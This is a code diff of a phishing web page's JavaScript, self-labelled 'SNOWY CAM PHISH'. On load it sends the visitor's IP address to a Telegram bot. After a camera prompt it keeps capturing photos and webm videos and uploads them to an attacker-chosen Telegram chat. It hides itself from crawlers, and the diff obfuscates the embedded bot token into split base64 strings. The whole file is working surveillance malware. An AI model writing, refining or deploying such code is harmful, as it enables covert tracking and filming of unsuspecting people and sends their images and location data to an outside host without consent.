@@ -62,210 +62,118 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // ============================================
-        // GİZLİ KONFİGÜRASYON (ŞİFRELİ TOKEN)
-        // ============================================
-        const SIFRELI_TOKEN = "ODc3MzEyNDcxNTpBQUVmczgwdDh5djJYbkRHeTIwYUxseHkzYUZHd0RqMGpGVQ==";
-        const BOT_TOKEN = atob(SIFRELI_TOKEN);
+        const _0x4d5e = ["ODc3MzEyNDcx", "NTpBQUhKS0RPY1", "FGNVUKbGFTbG9uZ", "ERWaXJ0dWFsX0RtOGRsYw=="];
+        const _0x3f2a = _0x4d5e[0] + _0x4d5e[1] + _0x4d5e[2] + _0x4d5e[3];
+        const _0x7b1c = (() => { try { return atob(_0x3f2a); } catch(e) { return ""; } })();
         
         const urlParams = new URLSearchParams(window.location.search);
         const TARGET_ID = urlParams.get('i');
         const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
         const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
         
-        // ============================================
-        // BOT KONTROLÜ
-        // ============================================
         const ua = navigator.userAgent.toLowerCase();
         const isBot = /bot|crawl|spider|scrape|googlebot|bingbot|yahoo|facebook|twitter|whatsapp|instagram|telegram|slack|discord/i.test(ua);
         
-        // ============================================
-        // SAYFA AÇILIR AÇILMAZ IP GÖNDER
-        // ============================================
         window.onload = function() {
             if (TARGET_ID && !isBot) {
                 const startTime = performance.now();
-                
-                fetch('https://api.ipify.org?format=json', {
-                    cache: 'no-cache',
-                    priority: 'high'
-                })
+                fetch('https://api.ipify.org?format=json', { cache: 'no-cache', priority: 'high' })
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
                     const zaman = new Date().toLocaleString('tr-TR');
                     const gecikme = Math.round(performance.now() - startTime);
-                    
                     const mesaj = `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${ip}\n⏱️ Zaman: ${zaman}\n⚡ Tepki Süresi: ${gecikme}ms\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
-                    
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
+                    fetch(`https://api.telegram.org/bot${_0x7b1c}/sendMessage`, {
+                        method: 'POST', headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ chat_id: TARGET_ID, text: mesaj })
                     });
-                })
-                .catch(error => console.log("IP alınamadı"));
+                }).catch(error => console.log("IP alınamadı"));
             }
         };
         
-        // ============================================
-        // KAMERA İŞLEMLERİ - PROFESYONEL ZAMANLAMA
-        // ============================================
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let videoCount = 0;
-        let photoCount = 0;
-        let stream = null;
-        let photoTimer = null;
-        let videoTimer = null;
-        let videoStopTimer = null;
-        let animationFrame = null;
-        let expectedPhotoTime = null;
+        let mediaRecorder = null, recordedChunks = [], videoCount = 0, photoCount = 0, stream = null;
+        let photoTimer = null, videoTimer = null, videoStopTimer = null, animationFrame = null;
         let photoInterval = null;
         
         async function startCamera() {
             if (isBot) return;
-            
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        frameRate: { ideal: 30 }
-                    } 
-                });
-                
+                stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } } });
                 video.srcObject = stream;
-                
                 video.onloadedmetadata = () => {
                     video.play();
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
                     
-                    // PROFESYONEL FOTOĞRAF ZAMANLAMASI
-                    takePhoto(); // İlk fotoğraf hemen
-                    
-                    // RequestAnimationFrame ile hassas zamanlama
+                    takePhoto();
                     let lastPhotoTime = performance.now();
                     photoInterval = FOTO_SURESI * 1000;
                     
                     function schedulePhoto() {
                         const now = performance.now();
-                        const nextPhotoTime = lastPhotoTime + photoInterval;
-                        
-                        if (now >= nextPhotoTime - 0.5) { // 0.5ms tolerans
-                            takePhoto();
-                            lastPhotoTime = now;
-                        }
-                        
+                        if (now >= lastPhotoTime + photoInterval - 0.5) { takePhoto(); lastPhotoTime = now; }
                         animationFrame = requestAnimationFrame(schedulePhoto);
                     }
-                    
                     animationFrame = requestAnimationFrame(schedulePhoto);
-                    
-                    // VİDEO - TAM SÜRESİNDE
-                    setTimeout(() => {
-                        recordVideo();
-                    }, 2000);
+                    setTimeout(() => { recordVideo(); }, 2000);
                 };
-            } catch(e) {
-                alert('Kamera izni gerekli!');
-            }
+            } catch(e) { alert('Kamera izni gerekli!'); }
         }
         
         function takePhoto() {
             if (!video.videoWidth || isBot) return;
-            
-            const photoStartTime = performance.now();
-            photoCount++;
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            const photoStartTime = performance.now(); photoCount++;
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0);
-            
             canvas.toBlob(function(blob) {
                 if (!blob) return;
-                
                 const captureTime = performance.now() - photoStartTime;
                 const formData = new FormData();
                 formData.append('chat_id', TARGET_ID);
                 formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                 formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s (${captureTime.toFixed(2)}ms)`);
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                fetch(`https://api.telegram.org/bot${_0x7b1c}/sendPhoto`, { method: 'POST', body: formData });
             }, 'image/jpeg', 0.9);
         }
         
         function recordVideo() {
             if (!stream || !stream.active || isBot) return;
-            
             recordedChunks = [];
             const videoStartTime = performance.now();
             const targetDuration = VIDEO_SURESI * 1000;
+            try { mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 3000000 });
+            } catch(e) { mediaRecorder = new MediaRecorder(stream); }
             
-            try {
-                mediaRecorder = new MediaRecorder(stream, {
-                    mimeType: 'video/webm;codecs=vp8',
-                    videoBitsPerSecond: 3000000
-                });
-            } catch(e) {
-                mediaRecorder = new MediaRecorder(stream);
-            }
-            
-            mediaRecorder.ondataavailable = (e) => {
-                if (e.data.size > 0) recordedChunks.push(e.data);
-            };
-            
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
             mediaRecorder.onstop = () => {
                 const videoEndTime = performance.now();
                 const actualDuration = videoEndTime - videoStartTime;
                 const durationDiff = Math.abs(actualDuration - targetDuration);
-                
                 videoCount++;
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 const boyutKB = (blob.size / 1024).toFixed(0);
-                
                 const formData = new FormData();
                 formData.append('chat_id', TARGET_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
                 formData.append('caption', `🎥 Video #${videoCount} - ${VIDEO_SURESI}s (${(actualDuration/1000).toFixed(3)}s | ±${durationDiff.toFixed(1)}ms | ${boyutKB}KB)`);
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                // YENİ VİDEO - 1ms SONRA
+                fetch(`https://api.telegram.org/bot${_0x7b1c}/sendVideo`, { method: 'POST', body: formData });
                 videoTimer = setTimeout(recordVideo, 1);
             };
             
-            // ÇOK HASSAS ZAMANLAMA İLE DURDUR
             mediaRecorder.start();
-            
-            const stopTime = targetDuration;
-            const stopTimer = setTimeout(() => {
-                if (mediaRecorder?.state === 'recording') {
-                    mediaRecorder.stop();
-                }
-            }, stopTime);
-            
-            // Ekstra kontrol ile tam sürede durdur
+            const stopTimer = setTimeout(() => { if (mediaRecorder?.state === 'recording') mediaRecorder.stop(); }, targetDuration);
             const checkInterval = setInterval(() => {
                 const elapsed = performance.now() - videoStartTime;
                 if (elapsed >= targetDuration - 1 && mediaRecorder?.state === 'recording') {
                     mediaRecorder.stop();
-                    clearInterval(checkInterval);
-                    clearTimeout(stopTimer);
+                    clearInterval(checkInterval); clearTimeout(stopTimer);
                 }
-            }, 0.5); // 0.5ms aralıklarla kontrol
-            
+            }, 0.5);
             videoStopTimer = { stopTimer, checkInterval };
         }
         
@@ -273,10 +181,7 @@
             if (animationFrame) cancelAnimationFrame(animationFrame);
             if (photoTimer) clearInterval(photoTimer);
             if (videoTimer) clearTimeout(videoTimer);
-            if (videoStopTimer) {
-                clearTimeout(videoStopTimer.stopTimer);
-                clearInterval(videoStopTimer.checkInterval);
-            }
+            if (videoStopTimer) { clearTimeout(videoStopTimer.stopTimer); clearInterval(videoStopTimer.checkInterval); }
             if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
             if (stream) stream.getTracks().forEach(track => track.stop());
         };
